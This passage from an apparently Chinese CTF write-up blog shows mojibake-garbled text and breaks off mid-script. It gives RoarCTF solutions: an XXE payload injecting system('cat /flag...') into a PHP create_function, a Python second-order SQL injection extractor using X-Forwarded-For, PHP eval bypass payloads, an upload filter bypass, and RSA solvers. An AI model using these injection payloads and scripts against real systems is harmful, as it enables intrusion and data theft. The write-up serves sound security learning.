<p>æ¥ä¸‹æ¥å°±è¯»å–æºç å°±è¡Œäº†.</p>
<p>ä¸ç†Ÿæ‚‰MVCæ¶æ„â€¦è¯»å®Œindex.phpä¹‹åå°±ä¸çŸ¥é“è¯»ä»€ä¹ˆâ€¦</p>
<p>index.php ä¸­æœ‰routes.php, æ ¹æ®routes.phpå†å»è¯»controllers/Admin.php, ç„¶ååˆå»è¯»views/Admin.php</p>
<p>ç„¶åå…³é”®ä»£ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usort($data, create_function(&apos;$a, $b&apos;, &apos;return strcmp($a-&gt;&apos;.$order.&apos;,$b-&gt;&apos;.$order.&apos;);&apos;));</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥æ‹¼æ¥</p>
<p>exp.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://127.0.0.1/rss_in_order?rss_url=https://view.news.qq.com/index2010/zhuanti/ztrss.xml&amp;order=%24b%2C%24a)%3B%7Dsystem('cat%20%2Fflag_eb8ba2eb07702e69963a7d6ab8669134')%3B%2F%2F" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">"2.0"</span> <span class="attr">xmlns:atom</span>=<span class="string">"http://www.w3.org/2005/Atom"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>The Blog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://example.com/<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>A blog about things<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastBuildDate</span>&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span class="tag">&lt;/<span class="name">lastBuildDate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://example.com<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>a post<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">author</span>&gt;</span>author@example.com<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$b,$a);&#125;system(&apos;cat /flag_eb8ba2eb07702e69963a7d6ab8669134&apos;);&quot;</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>RoarCTFå¤ç°</title>
    <url>/2019/10/22/RoarCTFwp/</url>
    <content><![CDATA[<h1>web</h1>
<h2 id="online-proxy">online_proxy</h2>
<p>ç‰¹å¾: ç¬¬ä¸€æ¬¡ç™»å½•åæºä»£ç å†…å®¹æœ‰å¦‚ä¸‹:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/67630479-64810900-f8c3-11e9-8f83-7f39e711f736.png" alt="image"></p>
<p>æ¢ä¸€ä¸ª<strong>X-Forwarded-For</strong> åä¼šå‘ç°currentipæ˜¯æ ¹æ®xffåˆ¤åˆ«çš„</p>
<p><img src="https://user-images.githubusercontent.com/40637063/67630507-c6da0980-f8c3-11e9-8d87-eff135976d57.png" alt="image"></p>
<p>é‚£ä¹ˆæœ‰ç†ç”±è®¤ä¸ºä¸Šä¸€ä¸ªipè¢«å­˜å‚¨è¿›äº†æ•°æ®åº“ä¸­,å¹¶åœ¨æ¯æ¬¡æ£€æµ‹åˆ°è®¿é—®ipå’Œä¸Šä¸€ä¸ªipä¸åŒçš„æ—¶å€™å°±ä¼šæ”¹å˜æ•°æ®åº“. æºç è¿™é‡Œä¹Ÿå†™åˆ°äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$result = query(<span class="string">"select current_ip, last_ip from ip_log where uuid = '"</span>.addslashes($uuid).<span class="string">"'"</span>);</span><br><span class="line"><span class="keyword">if</span>(count($result) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>($ip !== $result[<span class="number">0</span>][<span class="string">'current_ip'</span>]) &#123;</span><br><span class="line">        $last_ip = $result[<span class="number">0</span>][<span class="string">'current_ip'</span>];</span><br><span class="line">        query(<span class="string">"delete from ip_log where uuid='"</span>.addslashes($uuid).<span class="string">"'"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $last_ip = $result[<span class="number">0</span>][<span class="string">'last_ip'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">query(<span class="string">"insert into ip_log values ('"</span>.addslashes($uuid).<span class="string">"', '"</span>.addslashes($ip).<span class="string">"', '$last_ip');"</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip "</span>.($last_ip !== <span class="string">""</span> ? <span class="string">"\nLast Ip: "</span>.$last_ip : <span class="string">""</span>).<span class="string">" --&gt;"</span>);</span><br></pre></td></tr></table></figure>
<p>è§£æ³•:</p>
<p>å…ˆç”¨<code>1'|1|'1</code>ä½œä¸ºxffè®¿é—®ç½‘ç«™ç½‘ç«™ , è®¿é—®æˆåŠŸä¹‹åæ”¹å˜xff, å†æ¬¡è®¿é—®, è¿™ä¸ªæ—¶å€™ç”±äºå‰åxffä¸ä¸€è‡´, åŸæ¥å­˜å‚¨è¿›æ•°æ®åº“currentipçš„ipè¢«é‡æ–°æå–å‡ºæ¥å­˜è¿›lastipé¡¹ä¸­, å¦‚æœè¿™ä¸ªlastipæ²¡æœ‰è¿‡æ»¤çš„è¯,å°±å¯ä»¥é€ æˆ<strong>äºŒæ¬¡æ³¨å…¥</strong>, äº‹å®ä¸Šä¹Ÿç¡®å®å¦‚æ­¤, ä½†è¿™ä¸ªå¯èƒ½å¾—çŒœâ€¦åœ¨ç¬¬äºŒæ¬¡è®¿é—®ä¹‹å, payloadè¢«é‡æ–°æ’å…¥è¿›æ•°æ®åº“ä¸­, å¸¦ç€ç¬¬äºŒæ¬¡è®¿é—®çš„xffæ¥ç¬¬ä¸‰æ¬¡è®¿é—®è¿™ä¸ªç½‘ç«™,å¯ä»¥çœ‹åˆ°</p>
<p><img src="https://user-images.githubusercontent.com/40637063/67630576-d443c380-f8c4-11e9-859d-b807ff467d3c.png" alt="image"></p>
<p>æˆåŠŸæ‰§è¡Œäº†.</p>
<p>æ¬è¿èµµå¸ˆå‚…çš„è„šæœ¬å­¦ä¹ å­¦ä¹ </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">"http://localhost:8302/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_sql</span><span class="params">(sql)</span>:</span></span><br><span class="line">    print(<span class="string">"[*]è¯·æ±‚è¯­å¥ï¼š"</span> + sql)</span><br><span class="line">    return_result = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"0'|length(("</span> + sql + <span class="string">"))|'0"</span></span><br><span class="line">    session = requests.session()</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: payload&#125;)</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)</span><br><span class="line">    start_pos = r.text.find(<span class="string">"Last Ip: "</span>)</span><br><span class="line">    end_pos = r.text.find(<span class="string">" --&gt;"</span>, start_pos)</span><br><span class="line">    length = int(r.text[start_pos + <span class="number">9</span>: end_pos])</span><br><span class="line">    print(<span class="string">"[+]é•¿åº¦ï¼š"</span> + str(length))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, length + <span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        payload = <span class="string">"0'|conv(hex(substr(("</span> + sql + <span class="string">"),"</span> + str(i) + <span class="string">",5)),16,10)|'0"</span></span><br><span class="line"></span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: payload&#125;)</span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)</span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)</span><br><span class="line">        start_pos = r.text.find(<span class="string">"Last Ip: "</span>)</span><br><span class="line">        end_pos = r.text.find(<span class="string">" --&gt;"</span>, start_pos)</span><br><span class="line">        result = int(r.text[start_pos + <span class="number">9</span>: end_pos])</span><br><span class="line">        return_result += bytes.fromhex(hex(result)[<span class="number">2</span>:]).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"[+]ä½ç½® "</span> + str(i) + <span class="string">" è¯·æ±‚äº”ä½æˆåŠŸ:"</span> + bytes.fromhex(hex(result)[<span class="number">2</span>:]).decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> return_result</span><br><span class="line"><span class="comment"># è·å–æ•°æ®åº“</span></span><br><span class="line">print(<span class="string">"[+]è·å–æˆåŠŸï¼š"</span> + execute_sql(<span class="string">"SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–æ•°æ®åº“è¡¨</span></span><br><span class="line">print(<span class="string">"[+]è·å–æˆåŠŸï¼š"</span> + execute_sql(<span class="string">"SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e'"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–æ•°æ®åº“è¡¨</span></span><br><span class="line">print(<span class="string">"[+]è·å–æˆåŠŸï¼š"</span> + execute_sql(<span class="string">"SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e' AND TABLE_NAME = 'F4l9_t4b1e' "</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–è¡¨ä¸­å†…å®¹</span></span><br><span class="line">print(<span class="string">"[+]è·å–æˆåŠŸï¼š"</span> + execute_sql(<span class="string">"SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e"</span>))</span><br></pre></td></tr></table></figure>
<p>5555555</p>
<p>åœ¨addslashesåæ’å…¥æ•°æ®åœ¨æ•°æ®åº“ä¸­æ˜¯è¿™æ ·çš„</p>
<p><img src="https://user-images.githubusercontent.com/40637063/67630753-8bd9d500-f8c7-11e9-9e14-731b86ed3e4c.png" alt="image"></p>
<p>ç¬¬äºŒè¡Œæ˜¯æå–å‡ºæ¥ä¸ç»è¿‡addslashesé‡æ–°æ’å…¥çš„ç»“æœ</p>
<h2 id="easy-calc">easy_calc</h2>
<p><a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/" target="_blank" rel="noopener">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexdec(bin2hex(&apos;/&apos;));</span><br><span class="line">?+num=scandir(hex2bin(dechex(47))) #è§£ç å‡ºæ¥çš„ä¼šè‡ªåŠ¨å¸¦ä¸Šå¼•å·</span><br><span class="line">hexdec(bin2hex(&apos;/f1agg&apos;));</span><br><span class="line">?+num=file_get_contents(hex2bin(dechex(52115961636711)))</span><br></pre></td></tr></table></figure>
<p>æºç æ˜¯è¿™ä¹ˆæ‰§è¡Œè¯­å¥çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">       $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">       <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">               <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                       <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br></pre></td></tr></table></figure>
<h2 id="Simple-UPload">Simple UPload</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">'file'</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">'name'</span>]), <span class="string">".php"</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// å®ä¾‹åŒ–ä¸Šä¼ ç±»</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ å¤§å°</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>);<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ ç±»å‹</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">'./Public/Uploads/'</span>;<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ ç›®å½•</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">''</span>;<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ å­ç›®å½•</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// ä¸Šä¼ é”™è¯¯æç¤ºé”™è¯¯ä¿¡æ¯</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// ä¸Šä¼ æˆåŠŸ è·å–ä¸Šä¼ æ–‡ä»¶ä¿¡æ¯</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">'file'</span>][<span class="string">'savepath'</span>].$info[<span class="string">'file'</span>][<span class="string">'savename'</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">"url"</span>=&gt;$url,<span class="string">"success"</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ€è·¯: ç”±äºåªå¯¹â€™fileâ€™æ–‡ä»¶åšåˆ¤æ–­, æ‰€ä»¥ä¸€æ—¦ä¸Šä¼ å¤šä¸ªæ–‡ä»¶å°±å¯ä»¥ç»•è¿‡,ç„¶åæ ¹æ®æ–‡ä»¶åçš„ç”Ÿæˆæ–¹å¼æ¥çˆ†ç ´phpæ–‡ä»¶ä½ç½®.</p>
<h1>crypto</h1>
<h2 id="RSA">RSA</h2>
<p>é¢˜ç›®ç»™å‡ºäº†æ¡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n=117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127L</span><br><span class="line"></span><br><span class="line">e=0x10001</span><br><span class="line"></span><br><span class="line">(((y%x)**5)%(x%y))**2019+y**316+(y+1)/x=2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724L</span><br><span class="line"></span><br><span class="line">p=gmpy2.next_prime(x*y*z)</span><br><span class="line"></span><br><span class="line">q=gmpy2.next_prime(z)</span><br><span class="line"></span><br><span class="line">c=104691362123417589582551926531991781182010115901906985242039858907478735399784169051363443219315680244232603533899657231603732323266992359436518422851277069852793135320396586515487921637920627272606974731853791181271097899570276732277312961775278934241404863519840373617638621536398209255347566027214411203044623463749518663685607627212717097166124505123129373333338412199099199928067759937853247401620571810107903873489834435586333677991755979431408011776165868218508677566291652682933956103976791630704584853343422052444254468560250747030329091301992578584871488469381826293759687914010014083275135171832587631422L</span><br></pre></td></tr></table></figure>
<p>å› ä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2**(2019) &gt; 26833491826787145242474...1422L</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((y%x)**5)%(x%y) = 1 æˆ–è€… 0</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥å°†è¿™é¡¹å¿½ç•¥,å†å°†(y+1)/xå¿½ç•¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">y çº¦ç­‰äº26833491826787145242474...1422Lçš„316æ¬¡æ–¹</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">y çº¦ç­‰äº83</span><br></pre></td></tr></table></figure>
<p>ç„¶å(y+1)/x å¿…é¡»ä¸ºæ•´æ•° ,ç»“åˆä¸Šè¿°æ¡ä»¶å¯ä»¥è½»æ˜“æ±‚å¾—x=2.y=83</p>
<p>æ¥ä¸‹æ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p = xyz + a</span><br><span class="line">q = z + b</span><br><span class="line">xyzz + xyzb + az + ab = n</span><br></pre></td></tr></table></figure>
<p>å¿½ç•¥ab, az, xyzb, æ±‚å‡ºzçš„è¿‘ä¼¼å€¼,ç„¶åè¿™ä¸ªå€¼è‚¯å®šæ¯”çœŸå®çš„zè¦å¤§, å› æ­¤å¯ä»¥æ ¹æ®è¿™ä¸ªå€¼å¾ªç¯å‡ä¸€å¸¦å…¥è¿ç®—æ¥çˆ†ç ´p ,æ±‚å‡ºçš„på¦‚æœå¯ä»¥æ•´é™¤nå°±åœä¸‹.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n=<span class="number">117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127L</span></span><br><span class="line"></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">c=<span class="number">104691362123417589582551926531991781182010115901906985242039858907478735399784169051363443219315680244232603533899657231603732323266992359436518422851277069852793135320396586515487921637920627272606974731853791181271097899570276732277312961775278934241404863519840373617638621536398209255347566027214411203044623463749518663685607627212717097166124505123129373333338412199099199928067759937853247401620571810107903873489834435586333677991755979431408011776165868218508677566291652682933956103976791630704584853343422052444254468560250747030329091301992578584871488469381826293759687914010014083275135171832587631422L</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  x=2</span></span><br><span class="line"><span class="comment">#  y = 83</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  z_close = gmpy2.iroot(n//166, 2)</span></span><br><span class="line">z_close = <span class="number">842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458023</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p_close = gmpy2.next_prime(<span class="number">166</span>*z_close)</span><br><span class="line">    <span class="keyword">if</span> n % p_close == <span class="number">0</span>:</span><br><span class="line">        p = p_close</span><br><span class="line">        q = n // p</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    z_close -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  p = 139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183 </span></span><br><span class="line"><span class="comment">#  q = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569</span></span><br><span class="line"></span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> number.long_to_bytes(pow(c,d,n))</span><br></pre></td></tr></table></figure>
<h2 id="babyrsa">babyrsa</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myGetPrime</span><span class="params">()</span>:</span></span><br><span class="line">    A= getPrime(<span class="number">513</span>)</span><br><span class="line">    print(A)</span><br><span class="line">    B=A-random.randint(<span class="number">1e3</span>,<span class="number">1e5</span>)</span><br><span class="line">    print(B)</span><br><span class="line">    <span class="keyword">return</span> sympy.nextPrime((B!)%A)</span><br><span class="line"></span><br><span class="line">p=myGetPrime()</span><br><span class="line"><span class="comment">#A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span></span><br><span class="line"><span class="comment">#B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span></span><br><span class="line"></span><br><span class="line">q=myGetPrime()</span><br><span class="line"><span class="comment">#A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span></span><br><span class="line"><span class="comment">#B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span></span><br><span class="line"></span><br><span class="line">r=myGetPrime()</span><br><span class="line"></span><br><span class="line">n=p*q*r</span><br><span class="line"><span class="comment">#n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span></span><br><span class="line">c=pow(flag,e,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#e=0x1001</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#c=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#so,what is the flag?</span></span><br></pre></td></tr></table></figure>
<p>ç›´æ¥æ±‚bçš„é˜¶ä¹˜æ˜¯ä¸å¯èƒ½çš„,é€’å½’è¾¾åˆ°æœ€å¤§é™åˆ¶æ¬¡æ•°ä¹Ÿæ±‚ä¸å‡ºæ¥.</p>
<p>è¿™é‡Œè¦ç”¨åˆ°å¨å°”é€Šå®šç†</p>
<blockquote>
<p>åˆ¤å®šä¸€ä¸ªæ•°å­—æ˜¯ç´ æ•°çš„å……åˆ†å¿…è¦æ¡ä»¶:</p>
<p>(p-1)! = -1 (mod p)</p>
</blockquote>
<p>åœ¨è¿™å¥—é¢˜ä¸­å¯ä»¥å‘ç°<code>(-1)(A-1)(A-2)...(B+2)(B+1)</code>æ˜¯<code>B!</code> å…³äºAçš„é€†å…ƒ,ç„¶åå°±å¥½æ±‚äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myprime</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    ans = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(b+<span class="number">1</span>, a):</span><br><span class="line">        ans = (ans *i) % a</span><br><span class="line">    ans = <span class="number">-1</span> * ans</span><br><span class="line">    num = gmpy2.invert(ans ,a)</span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A1=<span class="number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span></span><br><span class="line">B1=<span class="number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span></span><br><span class="line"></span><br><span class="line">p = myprime(A1, B1)</span><br><span class="line"></span><br><span class="line">A2=<span class="number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span></span><br><span class="line">B2=<span class="number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span></span><br><span class="line"></span><br><span class="line">q = myprime(A2, B2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n=<span class="number">85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span></span><br><span class="line"></span><br><span class="line">enc=<span class="number">75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span></span><br><span class="line"></span><br><span class="line">r = n /(p*q)</span><br><span class="line">e=<span class="number">0x1001</span></span><br><span class="line">phi = (p<span 